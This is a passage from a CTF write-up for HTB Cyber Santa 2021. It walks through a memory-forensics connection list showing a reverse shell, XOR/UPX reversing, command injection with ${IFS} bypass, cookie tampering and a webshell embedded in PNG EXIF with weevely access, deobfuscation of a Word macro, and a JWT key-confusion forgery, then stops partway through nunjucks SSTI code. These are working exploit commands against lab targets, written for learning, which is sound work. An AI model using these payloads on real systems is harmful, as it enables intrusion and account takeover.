0x3e619578      TCPv6   ::      49152   ::      0       LISTENING       348     wininit.exe     N/A
0x3e619cc0      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       348     wininit.exe     N/A
0x3e630008      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3e630008      UDPv6   ::      0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3e630a20      TCPv4   0.0.0.0 49156   0.0.0.0 0       LISTENING       408     lsass.exe       N/A
0x3e630a20      TCPv6   ::      49156   ::      0       LISTENING       408     lsass.exe       N/A
0x3e648508      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       744     svchost.exe     N/A
0x3e648508      TCPv6   ::      49153   ::      0       LISTENING       744     svchost.exe     N/A
0x3e6b92c0      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       692     svchost.exe     N/A
0x3e6b92c0      TCPv6   ::      135     ::      0       LISTENING       692     svchost.exe     N/A
0x3e6b9910      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       692     svchost.exe     N/A
0x3e6f0bd8      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       744     svchost.exe     N/A
0x3e75f8e0      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       888     svchost.exe     N/A
0x3e762a40      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       400     services.exe    N/A
0x3e7686e8      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       888     svchost.exe     N/A
0x3e7686e8      TCPv6   ::      49154   ::      0       LISTENING       888     svchost.exe     N/A
0x3e8611f0      TCPv4   0.0.0.0 22      0.0.0.0 0       LISTENING       1676    sshd.exe        N/A
0x3e8611f0      TCPv6   ::      22      ::      0       LISTENING       1676    sshd.exe        N/A
0x3e9be828      TCPv4   0.0.0.0 49156   0.0.0.0 0       LISTENING       408     lsass.exe       N/A
0x3ed036c8      UDPv4   10.0.2.15       137     *       0               4       System  2021-11-25 19:12:23.000000
0x3ee98d80      TCPv4   10.0.2.15       49229   147.182.172.189 4444    ESTABLISHED     -       -       -
0x3f1b0df8      TCPv4   10.0.2.15       49216   212.205.126.106 443     ESTABLISHED     -       -       -
0x3f225df8      TCPv4   10.0.2.15       49222   212.205.126.106 443     ESTABLISHED     -       -       -
0x3f2cff50      UDPv4   0.0.0.0 0       *       0               -       -       2021-11-25 19:13:04.000000
0x3f2cff50      UDPv6   ::      0       *       0               -       -       2021-11-25 19:13:04.000000
0x3f4d7378      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3f4dad28      UDPv4   127.0.0.1       58426   *       0               3344    iexplore.exe    2021-11-25 19:13:31.000000
0x3f520ab8      UDPv4   0.0.0.0 0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3f520ab8      UDPv6   ::      0       *       0               2700    powershell.exe  2021-11-25 19:13:51.000000
0x3f546de8      UDPv4   0.0.0.0 0       *       0               636     VBoxService.ex  2021-11-25 19:14:14.000000
0x3f547008      TCPv4   10.0.2.15       49220   212.205.126.106 443     ESTABLISHED     -       -       -
0x3f561438      TCPv4   10.0.2.15       49215   204.79.197.203  443     ESTABLISHED     -       -       -
0x3f57c438      TCPv4   10.0.2.15       49218   95.100.210.141  443     ESTABLISHED     -       -       -
0x3f58b4c8      TCPv4   10.0.2.15       49217   212.205.126.106 443     ESTABLISHED     -       -       -
0x3f58c748      TCPv4   10.0.2.15       49223   212.205.126.106 443     ESTABLISHED     -       -       -
0x3f58e9d8      TCPv4   10.0.2.15       49225   172.67.177.22   443     ESTABLISHED     -       -       -
0x3f5c6df8      TCPv4   10.0.2.15       49219   95.100.210.141  443     ESTABLISHED     -       -       -
```

However the IP address `147.182.172.189` is connecting to port 4444 which is used
by default for metasploti reverse shells.

Also if we resolve the domain of the malicious URL we can see there are
connections to `172.67.177.22` which is normal since the powershell script was
downloaded from there.

```
$ drill windowsliveupdater.com
;; ->>HEADER<<- opcode: QUERY, rcode: NOERROR, id: 33774
;; flags: qr rd ra ; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;; windowsliveupdater.com.      IN      A

;; ANSWER SECTION:
windowsliveupdater.com. 300     IN      A       104.21.96.108
windowsliveupdater.com. 300     IN      A       172.67.177.22

;; AUTHORITY SECTION:

;; ADDITIONAL SECTION:

;; Query time: 34 msec
;; SERVER: 64.6.64.6
;; WHEN: Fri Dec  3 00:12:20 2021
;; MSG SIZE  rcvd: 72
```

The expected flag format is the following:

> 1. Find the full URL used to download the malware.
> 2. Find the malicious's process ID.
> 3. Find the attackers IP
>
> Flag Format: HTB{echo -n "http://url.com/path.foo_PID_127.0.0.1" | md5sum}

So wrapping up all we got so far, I expected the flag to be the md5 hash of
one of the first two payload below but it's not, so I tested also a bunch of other.

```
https://windowsliveupdater.com/update.ps1_2700_172.67.177.22
https://windowsliveupdater.com/update.ps1_2700_147.182.172.189

https://windowsliveupdater.com/update.ps1_2700_93.184.220.29
https://windowsliveupdater.com/update.ps1_2700_212.205.126.106
https://windowsliveupdater.com/update.ps1_2700_204.79.197.203
https://windowsliveupdater.com/update.ps1_2700_95.100.210.141
https://windowsliveupdater.com/update.ps1_2700_104.21.96.108
https://windowsliveupdater.com/update.ps1_4036_147.182.172.189
https://windowsliveupdater.com/update.ps1_4028_147.182.172.189
https://windowsliveupdater.com/update.ps1_3720_147.182.172.189
```

In the end I didn't managed to get the flag.

### Gift Wrapping - Reversing

A quick `strings` on the binaries shows it is packed with UPX.

So let's unpack it: `upx -d rev_giftwrap/giftwrap`.

Then reverse with radare2/rizin or ioita/cutter.

```
$ r2 rev_giftwrap/giftwrap
[0x00401700]> aaa
[0x00401700]> pdf@main
```

![](https://i.imgur.com/dNJjxcm.png)

The macro view is that we are asked an input, this input is xored with `0xf3`, then an obfuscated function (`fcn.00401080`) is called with 3 arguments: `0x17`, our xored input and and object called `CHECK` that is likely the xored right value of the flag, then there is a comparison to check if the transformed input match the flag and print a message accordingly.

It's a bit clearer when displayed as a conditional graph.

![](https://i.imgur.com/e9icJZc.png)

Checking the decompiled code with the ghidra plugin also allow to understand the behavior.

![](https://i.imgur.com/KuBgrrL.png)

Now there two ways to solve this challenge and retrieve the flag.

#### Naive approach

The quick and easy way is to display the `CHECK` value while statically analysing the binary and xor it back with `0xf3`.

```
[0x00401a0b]> psz @obj.CHECK
\xbb\xa7\xb1\x88\x86\x83\x8b\xac\xc7\xc2\x9d\x87\xac\xc6\xc3\xac\x9b\xc7\x81\x97\xd2\xd2\x8e
[0x00401700]> px0 @obj.CHECK
bba7b18886838bacc7c29d87acc6c3ac9bc78197d2d28e
```

```
$ xortool-xor -h bba7b18886838bacc7c29d87acc6c3ac9bc78197d2d28e -h f3
HTB{upx_41nt_50_h4rd!!}
```

#### Elegant approach

The more difficult but elegant solution is to dynamically debug and
interact with the binary.

First we launch the binary in debug mode and set two breakpoints:

- `0x004019b1`: one after the `scanf()` to be able to overwrite the stack and repalce the placeholder input with the xord flag.
- `0x00401a0b`: one before the comparision (before _Welcome inside..._ or _Wrong password! Who are you?!?_ is displayed and the program quits) to be able to inspect the value of the plaintext flag.

```
$ r2 -d rev_giftwrap/giftwrap
[0x00401700]> aaa
[0x00401700]> pdf@main
[0x00401700]> db 0x004019b1
[0x00401700]> db 0x00401a0b
```

Then we start the program and input a placeholder value that has the same size (23 bytes) as the flag.

```
[0x00401700]> dc
What's the magic word? AAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 0x401a0b
```

Note: to find the size of the flag we just have read `obj.CHECK`, here I
substract one to remove the size of the string terminator (`0x00`) and
divide by two because it is printed in hexadecimal.

```
[0x00401700]> px0 @obj.CHECK | ruby -e 'puts (STDIN.read.size - 1)/2'
23
```

The we display the stack (`rsp`) and see that it contains the 23 _A_
placeholder after an offset of 16 bytes (`0x10`).

```
[0x004019de]> pxr@rsp
0x7ffcf8190b90 ..[ null bytes ]..   00000000 rsp
0x7ffcf8190b98 0x00000000f8190c20    ....... 4162391072
0x7ffcf8190ba0 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf8190ba8 0x4141414141414141   AAAAAAAA ascii ('A')
0x7ffcf8190bb0 0x0041414141414141   AAAAAAA. ascii ('A')
0x7ffcf8190bb8 ..[ null bytes ]..   00000000
```

So let's rewrite the stack and replace the placeholder by the xored flag:

```
[0x004019de]> w $(psz @obj.CHECK) @ rsp+0x10
[0x004019de]> pxr@rsp
0x7ffd17ee5e10 ..[ null bytes ]..   00000000 rsp
0x7ffd17ee5e18 0x0000000017ee5ea0   .^...... 401497760
0x7ffd17ee5e20 0xac8b838688b1a7bb   ........
0x7ffd17ee5e28 0xacc3c6ac879dc2c7   ........
0x7ffd17ee5e30 0x008ed2d29781c79b   ........
0x7ffd17ee5e38 ..[ null bytes ]..   00000000
```

The `CHECK` object seems read the flag from `rsi`.

![](https://i.imgur.com/t3IdPdH.png)

So we just have to read the value of `rsi` after the check before
the comparison and jump.

```
[0x004019b1]> dc
hit breakpoint at: 0x401a0b
[0x00401a0b]> dr rsi
0x7fffc8f8db90
[0x00401a0b]> psz @rsi
HTB{upx_41nt_50_h4rd!!}\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3\xf3
```

This method is more complex but would be handful if the obfuscation was
harder than a XOR or if that `obj.CHECK` couldn't be read directly.

### Sleigh - Pwn

I didn't do it.

## Day 3 - 03/12/2021

### Gadget Santa - Web

#### Source code review

On the web app home page we can run command through get parameters like that
http://178.128.35.132:30784/?command=ups_status.

The command is received like that by the controller
in `challenge/controllers/MonitorController.php`

```php
<?php
class MonitorController
{
    public function index($router)
    {
        $command = isset($_GET['command']) ? $_GET['command'] : 'welcome';
        $monitor = new MonitorModel($command);
        return $router->view('index', ['output' => $monitor->getOutput()]);
    }
}
```

The received command is used to build a model (`challenge/models/MonitorModel.php`)

```php
<?php
class MonitorModel
{
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

On init the model `MonitorModel` wil call the function `sanitize()` that
remove all whitespaces. The when the view is rendered the function `getOutput()`
is called and will execute the system script `santa_mon.sh` where our command will
be passed as argument.

```bash
#!/bin/bash

ups_status() {
    curl localhost:3000;
}

restart_ups() {
    curl localhost:3000/restart;
}

list_processes() {
    ps -ef
}

list_ram() {
    free -h
}

list_connections() {
    netstat -plnt
}

list_storage() {
    df -h
}

welcome() {
    echo "[+] Welcome to Santa's Monitor Gadget!"
}

if [ "$#" -gt 0 ]; then
    $1
fi
```

But nothing prevent us to perform an RCE, we do not need whitespaces for that,
for example we can chain the commands:

http://178.128.35.132:30784/?command=ups_status;id

output:

```
{"status": "running"}uid=1000(www) gid=1000(www) groups=1000(www)
```

Looking in `config/ups_manager.py` we can see there is another web application
running on localhost that is used to get the UPS status but this app has an
interresting route for us: `get_flag`

```python
def http_server(host_port,content_type="application/json"):
  class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self) -> None:
      def resp_ok():
        self.send_response(200)
        self.send_header("Content-type", content_type)
        self.end_headers()
      if self.path == '/':
        resp_ok()
        if check_service():
          self.wfile.write(get_json({'status': 'running'}))
        else:
          self.wfile.write(get_json({'status': 'not running'}))
        return
      elif self.path == '/restart':
        restart_service()
        resp_ok()
        self.wfile.write(get_json({'status': 'service restarted successfully'}))
        return
      elif self.path == '/get_flag':
        resp_ok()
        self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
        return
      self.send_error(404, '404 not found')
    def log_message(self, format, *args):
      pass
  class _TCPServer(TCPServer):
    allow_reuse_address = True
  httpd = _TCPServer(host_port, CustomHandler)
  httpd.serve_forever()
```

But we cant just run http://178.128.35.132:30784/?command=ups_status;curl%20localhost:3000/get_flag
like that because the whitespace will be removed by the sanitize function.

#### Exploitation: security bypass

To bypass the sanitize function we'll use IFS - Internal field separator.

http://178.128.35.132:30784/?command=ups_status;curl${IFS}localhost:3000/get_flag

output:

```
{"status": "running"}{"status": "HTB{54nt4_i5_th3_r34l_r3d_t34m3r}"}
```

### Naughty List - Pwn

I didn't do it.

### Missing Reindeer - Crypto

I didn't do it.

### Intercept - Reversing

I didn't do it.

### Persist - Forensics

I didn't do it.

## Day 4 - 04/12/2021

### Elf Directory - Web

#### Cookie manipulation

For this challenge we do not have the source code.

We can register an account, log in, and see our pofile on read-only mode with
the following message:

> You don't have permission to edit your profile, contact the admin elf to approve your account!

We have no way to contat the admin for now.

I used [ctf-party](https://github.com/noraj/ctf-party) to decode and re-encode our cookie
trying to become an approved user.

```
$ ctf-party 'eyJ1c2VybmFtZSI6Im5vcmFqIiwiYXBwcm92ZWQiOmZhbHNlfQ%3D%3D' urldecode from_b64
{"username":"noraj","approved":false}
$ ctf-party '{"username":"noraj","approved":true}' to_b64 urlencode
eyJ1c2VybmFtZSI6Im5vcmFqIiwiYXBwcm92ZWQiOnRydWV9
```

It works, we now are able to modify our profile.

#### Upload

We can't upload a webshell even when modifying the extention + content type + adding
the PNG magic bytes.

So let's upload some legit PNG files to find the upload path and see if the files
are renamed after upload. Maybe our webshell was not removed even if we received
an error for invalid files.

I uploaded two times the same image that was partially renamed:

- http://178.62.75.187:31547/uploads/87ed6_Flag_of_France.png
- http://178.62.75.187:31547/uploads/c7b03_Flag_of_France.png

So 5 random hexadecimal characters were prepended, we can bruteforce to see if our webshell
is present on the web server or not.

I tried the about 1M possibilities but it seems invalid files are removed
and there are too much possibilities to perform a race condition.

```
$ cook hex:hex:hex:hex:hex:_agent.php -config-path /usr/share/cook/cook.yaml | ffuf -u http://178.62.75.187:31547/uploads/FUZZ -w -
```

So I though about using the same technique as during
[ECSC 2019 Quals Team France](https://blog.raw.pm/en/ECSC-2019-Quals-write-ups/#302-Ceci-n-est-pas-une-pipe-Web):
embedding a webshell in exif metadata:

```
$ exiftool -documentname="$(cat agent.php| tr '\n' ' ')" noraj.png
```

I have a hidden webshell at http://178.62.75.187:31547/uploads/2e5ea_noraj.png.php

RCE successful:

```
$ weevely http://178.62.75.187:31547/uploads/2e5ea_noraj.png.php noraj

[+] weevely 4.0.1

[+] Target:     178.62.75.187:31547
[+] Session:    /home/noraj/.weevely/sessions/178.62.75.187/2e5ea_noraj.png_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=1000(www) gid=1000(www) groups=1000(www)
webelfdirectory-1225-667cc6cfcd-772pc:/www/uploads $
```

Grab the flag:

```
$ webelfdirectory-1225-667cc6cfcd-772pc:/www/uploads $ cat /flag_65890d927c37c33.txt
HTB{br4k3_au7hs_g3t_5h3lls}
```

### Minimelfistic - Pwn

I didn't do it.

### Meet Me Halfway - Crytpo

I didn't do it.

### Upgraded - Reversing

I didn't do it.

### Giveaway - Forensics

We have a to face a MS word document including macro `.docm`.

We can extract the archive:

```
$ 7z x christmas_giveaway.docm
```

We can see `word/vbaData.xml` which describe the macros and the macro
compiled as a binary itself `word/vbaProject.bin`.

```xml
<wne:mcds>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.AUTO_OPEN" wne:name="Project.ThisDocument.Auto_Open" wne:bEncrypt="00" wne:cmg="56"/>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.H" wne:name="Project.ThisDocument.h" wne:bEncrypt="00" wne:cmg="56"/>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.AUTOOPEN" wne:name="Project.ThisDocument.AutoOpen" wne:bEncrypt="00" wne:cmg="56"/>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.WORKBOOK_OPEN" wne:name="Project.ThisDocument.Workbook_Open" wne:bEncrypt="00" wne:cmg="56"/>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.FINDTEST" wne:name="Project.ThisDocument.findTest" wne:bEncrypt="00" wne:cmg="56"/>
  <wne:mcd wne:macroName="PROJECT.THISDOCUMENT.SECONDTEST" wne:name="Project.ThisDocument.secondTest" wne:bEncrypt="00" wne:cmg="56"/>
</wne:mcds>
```

We can decompile the macro with `pcode2code`.

```
$ pcode2code christmas_giveaway.docm > macro.vbs
```

The part of the code interesting us that we need to deobfuscate is the following.

```vbs
    Dim strFileURL, HPkXUcxLcAoMHOlj, cxPZSGdIQDAdRVpziKf, fqtSMHFlkYeyLfs, ehPsgfAcWaYrJm, FVpHoEqBKnhPO As String
    
    HPkXUcxLcAoMHOlj = "https://elvesfactory/" & Chr(Asc("H")) & Chr(84) & Chr(Asc("B")) & "" & Chr(123) & "" & Chr(84) & Chr(Asc("h")) & "1" & Chr(125 - 10) & Chr(Asc("_")) & "1s" & Chr(95) & "4"
    cxPZSGdIQDAdRVpziKf = "_" & Replace("present", "e", "3") & Chr(85 + 10)
    fqtSMHFlkYeyLfs = Replace("everybody", "e", "3")
    fqtSMHFlkYeyLfs = Replace(fqtSMHFlkYeyLfs, "o", "0") & "_"
    ehPsgfAcWaYrJm = Chr(Asc("w")) & "4" & Chr(110) & "t" & Chr(115) & "_" & Chr(Asc("f")) & "0" & Chr(121 - 7) & Chr(95)
    FVpHoEqBKnhPO = Replace("christmas", "i", "1")
    FVpHoEqBKnhPO = Replace(FVpHoEqBKnhPO, "a", "4") & Chr(119 + 6)
```

Doing it manually gives us the flag.

```
HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}
```

## Day 5 - 05/12/2021

### Naughty or Nice - Web

By reading the routes source code at `challenge/routes/index.js` we understand most
endpoints are retricted to user `admin`.

For exmaple:

```javascript
router.post('/api/elf/edit', AuthMiddleware, async (req, res) => {
  return db.getUser(req.data.username)
    .then(user => {
      if(user.username != 'admin') return res.status(403).send(response('Access denied'));
      const {elf_name, type, editelf_id} = req.body;
      if (elf_name, type, editelf_id) {
        if (type != 'nice' && type != 'naughty') return res.status(403).send(response('The type has to be either "nice" or "naughty"!'));
        return db.editName(elf_name, type, editelf_id)
          .then(() => res.send(response('Elf details updated successfully!')))
          .catch(() => res.status(500).send(response('Something went wrong, please try again!')));
      }
      res.status(403).send(response('Missing required parameters, make sure to fill out all the fields!'));
    })
    .catch(() => res.status(500).send(response('Something went wrong!')));
});
```

To try to become admin I tried some SQL truncation on the username at registration
(`VARCHAR(255)`) but it didn't work.


There is a JWT token, and either by decoding it or reading the source code
`challenge/helpers/JWTHelper.js` we see the data section contains a public key,
which is unusual.

```
$ jwt-tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vcmFqIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.qQKaGpRXCgSe3daQwKuJo-yp-seXnqpujsEa9923GeelrGwmLtT6DlG0lF5-HFMzhF6TSj0OQ4VUh_qvgK4xDLZGk-VKVPCn4b0YX5Vcf7-Sia5-G_hmZGnSny7CV9TwS3ceykDsaR3eDxcFFna19yVTJsrat8XRuWF5ywOhUrEAaY5Rg2GoL7jXuNHxMWO0QKwHPGbJ7IqN0zB5pmw_8PSXejJZMyWqISS5xYClirs9239GCvIIg5d1U86nibZxSaZrREOZDfZ0xsml7RdirNL17bJvNm8NlpjUKPslj4OZS3lVfiLaTaN1xkP4GINuvsDPFEbQLEu6s0CEhmAj-Q

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] typ = "JWT"

Token payload values:
[+] username = "noraj"
[+] pk = "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs+Y0gINEWebFL/SwGyiG
9/hIOuTlXj3bNs4SwWDxOsexYcu6PNQ/jffMB62foArT1m00CexBuMXdQElgzby4
n3XfA4eSptYV09gM+nap1Ojxp6V21u5LcjRLgerp6QppAd1I2+Lg71UuZknAQPLa
S/lgVHo5GMc2ZuOAuJPD1aQ+CCtdaNS/jqjgITQtB5VCkJ9S3ImRJwDy4oeqpmkR
burvdhH6WVkCT77NkaJzntQb5oC8Pg88/s1CLi5KbhCDnjnxOtwzD24NsAHeFyqZ
K4bo/V5yO8e2UsBF43ufq+OLxtnXh01VvbqUFv6aftd4soZFwv4IZV8nl9gHoKT+
XwIDAQAB
-----END PUBLIC KEY-----"
[+] iat = 1638724236    ==> TIMESTAMP = 2021-12-05 18:10:36 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```


Having the public key corresponding to the private key used to sign the JWT token
gave me the idea to tamper it and perform a key confusion attack to spoof the
admin identity.

```
$ jwt-tool -pk noraj.pem -I -pc username -pv admin -X k eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vcmFqIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.qQKaGpRXCgSe3daQwKuJo-yp-seXnqpujsEa9923GeelrGwmLtT6DlG0lF5-HFMzhF6TSj0OQ4VUh_qvgK4xDLZGk-VKVPCn4b0YX5Vcf7-Sia5-G_hmZGnSny7CV9TwS3ceykDsaR3eDxcFFna19yVTJsrat8XRuWF5ywOhUrEAaY5Rg2GoL7jXuNHxMWO0QKwHPGbJ7IqN0zB5pmw_8PSXejJZMyWqISS5xYClirs9239GCvIIg5d1U86nibZxSaZrREOZDfZ0xsml7RdirNL17bJvNm8NlpjUKPslj4OZS3lVfiLaTaN1xkP4GINuvsDPFEbQLEu6s0CEhmAj-Q

Original JWT:

File loaded: noraj.pem
jwttool_401db23acc193bab2f34eeb0bef34322 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzK1kwZ0lORVdlYkZML1N3R3lpR1xuOS9oSU91VGxYajNiTnM0U3dXRHhPc2V4WWN1NlBOUS9qZmZNQjYyZm9BclQxbTAwQ2V4QnVNWGRRRWxnemJ5NFxubjNYZkE0ZVNwdFlWMDlnTStuYXAxT2p4cDZWMjF1NUxjalJMZ2VycDZRcHBBZDFJMitMZzcxVXVaa25BUVBMYVxuUy9sZ1ZIbzVHTWMyWnVPQXVKUEQxYVErQ0N0ZGFOUy9qcWpnSVRRdEI1VkNrSjlTM0ltUkp3RHk0b2VxcG1rUlxuYnVydmRoSDZXVmtDVDc3TmthSnpudFFiNW9DOFBnODgvczFDTGk1S2JoQ0Ruam54T3R3ekQyNE5zQUhlRnlxWlxuSzRiby9WNXlPOGUyVXNCRjQzdWZxK09MeHRuWGgwMVZ2YnFVRnY2YWZ0ZDRzb1pGd3Y0SVpWOG5sOWdIb0tUK1xuWHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODcyNDIzNn0.vYaQurOdvoY9iUcBBsbrtVvjWuvY7bvcMhl-UbXpX9c
```

Using the tampered cookie I can authenticate as admin. We have access to more
features but we still need to find a way to read a system file (`/flag.txt`
as seen in `Dockerfile`).

I took a look at dependencies and saw nothing obvious so it's time to use tools.

With `npm-check-updates` I saw a few dependencies were outdated. So maybe one
of them is vulnerable.

```
$ ncu
Checking /home/noraj/CTF/HTB_Cyber_Santa_2021/Naughty_or_Nice/web_naughty_or_nice/challenge/package.json
[====================] 7/7 100%

 cookie-parser  ^1.4.4  →   ^1.4.6
 nunjucks       ^3.2.0  →   ^3.2.3
 sqlite-async   ^1.1.1  →   ^1.1.2
 nodemon        ^2.0.2  →  ^2.0.15

Run ncu -u to upgrade package.json
```

`nunjucks` is a templating engine so it's prone to RCE or LFI if it's vulnerable.

I check on Snyk vulnerability DB and found that this version was vulnerable to
a prototype pollution attack: https://security.snyk.io/vuln/SNYK-JS-NUNJUCKS-1079083

Here is the upstream vulnerability report: https://github.com/mozilla/nunjucks/issues/1331

Editing an elf name and replacing it's name by `{{ 7*7 }}` (`/api/elf/edit`),
we can then see on the main page using the vulnerable card helper the number 49,
proving the SSTI. So it's different from the prototype polution but it put us
on the way to abuse the templating engine.

```javascript
router.get('/', (req, res) => {
  return db.listNames()
    .then(elfList => {
      return CardHelper.generateCard(elfList)
        .then(cardHTML => {
          return res.send(cardHTML);
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
    });
});
```

`challenge/helpers/CardHelper.js`:

```javascript
const nunjucks   = require('nunjucks');

module.exports = {
  async generateCard(elfList) {
    return new Promise(async (resolve, reject) => {
      try {
        let NaughtyNames = NiceNames = '<br>';
        for(elfData of elfList) {
          if (elfData.type == 'naughty') {
            NaughtyNames = `${NaughtyNames}\n${elfData.elf_name}<br>`;
          }
          else if (elfData.type == 'nice') {
            NiceNames = `${NiceNames}\n${elfData.elf_name}<br>`;
          }
        }
        card = `
          {% extends "card.html" %}
          {% block card %}
          <div class="card">
            <div class="card-page cart-page-front">
              <div class="card-page cart-page-outside"></div>
              <div class="card-page cart-page-inside">
              <p><span class='nheader green'>Nice List</span>
                ${NiceNames}
              </p>
              </div>
            </div>
            <div class="card-page cart-page-bottom">
              <p><span class='nheader red'>Naughty List</span>
                ${NaughtyNames}
              </p>
            </div>
          </div>
          {% endblock %}
        `;
        resolve(nunjucks.renderString(card));
      } catch(e) {
        reject(e);
